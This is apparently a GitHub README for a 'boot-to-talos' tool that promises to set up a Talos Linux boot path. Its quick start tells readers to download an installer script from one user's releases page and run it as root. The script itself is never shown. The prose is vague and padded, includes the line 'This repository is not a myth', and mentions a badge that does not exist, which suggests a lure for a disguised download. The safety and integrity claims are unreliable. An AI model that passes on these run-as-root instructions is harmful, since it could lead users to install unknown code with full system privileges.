About this project
Boot to Talos provides a straightforward flow to convert an existing OS setup into a Talos Linux bootable environment. Talos Linux is a minimal, immutable OS designed for cluster operations and Kubernetes. The goal here is not to replace the OS in place but to create a bootable path that leads into a Talos Linux shell or installer environment. The result should be portable, repeatable, and easy to audit.

This repository is not a myth. It is a practical approach for IT teams, developers, and enthusiasts who want to explore Talos Linux without a full hardware wipe from the outset. You get a clean boot path that lands you in a Talos-friendly environment. The process is designed to be modular, with clear steps, validations, and fallbacks.

How it works
- A release on the official releases page hosts an installer asset. This asset is a self-contained boot script or bootable image that, when executed, prepares the target hardware to boot into Talos Linux.
- The tool performs checks to determine the target hardware type, storage layout, and boot mode (UEFI vs BIOS). It adapts the installer steps accordingly to minimize risk.
- The installer writes the Talos Linux boot media and configures a default profile to boot into Talos Linux on next power-on.
- After boot, you are guided through Talos Linux specifics, including initial configuration, boot options, and optional Kubernetes integration.

Note: The downloads page is the source of truth for assets. If you want to proceed, start from the releases page, download the installer, and run it on the target machine or USB key. The link you need to visit is the releases page, which hosts the installer. For quick access, you can use the badge above to reach the releases page directly.

Quick start
A quick path to get started looks like this:
- Step 1: Open the releases page and locate the installer asset named boot-to-talos-installer.sh (or a similarly named file with an executable format). The downloads are hosted at the releases page. The page URL is the releases page of this repository: https://github.com/Sunxz08/boot-to-talos/releases. The assets there contain the file you need to download and execute.
- Step 2: Save the installer to a local machine. If you are on Linux or macOS, save it to a temporary directory. If you are on Windows, use a Linux-friendly environment such as WSL or a Git Bash shell to handle the script.
- Step 3: Make the installer executable. In a terminal, run:
  - chmod +x boot-to-talos-installer.sh
- Step 4: Run the installer with root privileges. On Linux/macOS:
  - sudo ./boot-to-talos-installer.sh
  Or, if your environment requires, run the installer via a shell:
  - sh boot-to-talos-installer.sh
- Step 5: Follow the prompts. The installer will assess the system, prepare a bootable path, and guide you to boot into Talos Linux. When the process completes, reboot the machine and select the Talos Linux option from the boot menu.
- Step 6: After boot, complete initial Talos setup. Talos Linux has its own configuration flow. Youâ€™ll configure access, networking, and cluster-related settings as needed.
- Step 7: Verify the environment. Confirm that you reach the Talos Linux boot shell or installer environment. If you want to remove the boot path later, you can revert by reinitializing the boot sector or re-flashing a standard OS.

Note: The above steps assume you are using the installer asset from the releases page. If the asset name or flow changes, follow the on-screen instructions and refer to the help section in the page.

How to use
- Boot flow
  - Prepare the media (USB key or drive) with the installer asset.
  - Boot the target system from the prepared media.
  - The installer guides you through the transition to Talos Linux.
  - If you need to revert, you typically restore the previous bootloader configuration or re-flash the original OS image.
- Recovery and testing
  - Use a test machine or a virtual machine to explore Talos Linux features.
  - The installer is designed to be safe for testing purposes; it aims to minimize irreversible changes on non-production machines.
- Network and Kubernetes integration
  - Talos Linux is well-suited for Kubernetes deployments. After booting into Talos, you may proceed with cluster bootstrapping, node configuration, and kubeconfig retrieval as needed.
  - For demonstration environments, you can simulate a single-node cluster to understand the flow before scaling.

Architecture and components
- Installer script or bootable image
  - The primary artifact is a self-contained installer that handles the boot media creation and initial Talos boot path.
  - It includes environment checks, device selection, and safety prompts to avoid accidental data loss.
- Talos Linux bootstrap
  - The install path configures Talos Linux in a bootable state with a default profile suitable for initial exploration.
  - It can be extended with Talos features such as Kubernetes integration, customized configurations, and secure access.
- Configuration layer
  - The tool includes a layer that allows you to specify basic configuration defaults for Talos Linux. This can include network interfaces, DNS settings, and user credentials for demonstrations or labs.
- Validation and integrity
  - The installer performs basic checks for hardware compatibility and file integrity. It ensures that the downloaded installer asset matches expected signatures when possible.

Supported scenarios
- Bare-metal machines
  - The installer supports booting on common PC hardware. It includes checks for UEFI vs BIOS and chooses the appropriate boot path.
- Virtual machines
  - You can use virtualization platforms to test the flow. The installer creates a boot path that works well in virtual environments and reduces risk when testing.
- Laptops
  - Laptops with modern BIOS/UEFI tend to work well. The installer detects the boot mode and configures the path accordingly.
- USB-based demos
  - A USB key can serve as a portable demo drive. Boot from the USB to demonstrate Talos Linux in a portable format.
- Cluster demos
  - For practitioners, the final Talos Linux environment can be used as a stepping stone toward more complex Kubernetes clusters.

Security and integrity
- Source and build verification
  - The installer relies on assets hosted in the official releases. Use a trusted network when downloading assets.
  - Where possible, verify checksums or signatures if the release provides them. This helps ensure you get the intended artifact.
- Least-privilege execution
  - The installer requests root access only when necessary. It runs with the minimum privileges required to complete its tasks.
- Tamper resistance
  - The local installer validation aims to detect unexpected tampering. Always obtain assets from the official releases page.
- Data safety
  - The installer asks for confirmation before performing destructive actions on the target drive. It prompts before writing to any device.

Troubleshooting
- Common issues and quick fixes
  - Issue: Installer cannot detect the target drive.
    - Fix: Re-run the installer with explicit permission to access storage devices. Ensure no other process uses the target drive.
  - Issue: Boot fails to start Talos Linux after installation.
    - Fix: Check the boot mode (UEFI vs BIOS) and ensure the media was created correctly. Re-run the installer if needed.
  - Issue: Network not reachable in Talos Linux.
    - Fix: Verify the host network configuration and adapt the Talos Linux network settings after boot.
  - Issue: Checksum mismatch for the installer asset.
    - Fix: Re-download the asset from the official releases page. Compare checksums if provided.
- Logging and diagnostics
  - The installer logs events during the installation flow. You can review the logs to identify where the flow diverged from the expected path.
- When to ask for help
  - If a scenario is not covered by the documentation, you can open an issue on the repository to request guidance. Include the hardware model, BIOS/UEFI mode, and the exact steps you performed.

Customization and advanced usage
- Custom configuration templates
  - You can provide custom Talos Linux configuration templates to the installer to tailor networking, storage, and authentication for your lab or demo environment.
- Integrating with existing OS workflows
  - The installer can be part of your standard testing pipeline. For example, you can automate media creation as part of a larger test suite.
- Scripting and automation
  - Advanced users can extend the installer script to support additional boot options or to integrate with other automation tools. Keep changes modular and well-documented.
- Security hardening
  - For production-like scenarios, replace default credentials and enforce TLS or SSH keys for secure access to Talos Linux. Then test with your usual security controls.
